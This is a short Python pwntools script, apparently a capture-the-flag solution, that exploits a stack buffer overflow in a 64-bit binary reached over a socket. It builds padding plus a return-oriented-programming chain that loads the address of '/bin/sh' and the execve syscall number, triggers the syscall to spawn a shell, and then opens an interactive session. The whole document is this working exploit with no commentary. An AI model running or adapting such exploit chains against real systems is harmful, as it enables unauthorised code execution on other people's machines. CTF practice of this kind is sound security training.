# 64位
from pwn import *

# ip_port = "nc 61.147.171.105 61714".split(" ")
# p = remote(ip_port[-2], ip_port[-1])

ip_port = "localhost:56360".split(":")
io = remote(ip_port[-2], ip_port[-1])

# context.log_level = "debug"

binsh = 0x0404040

pop_rax = 0x000000000040117e
pop_rdi = 0x0000000000401180
pop_rsi = 0x0000000000401182
pop_rdx = 0x0000000000401183
syscall_addr = 0x0000000000401185
ret = 0x000000000040101a
offset = 0x40 + 8

payload = b'a' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(0)
payload += p64(syscall_addr)

io.sendline(payload)

io.interactive()
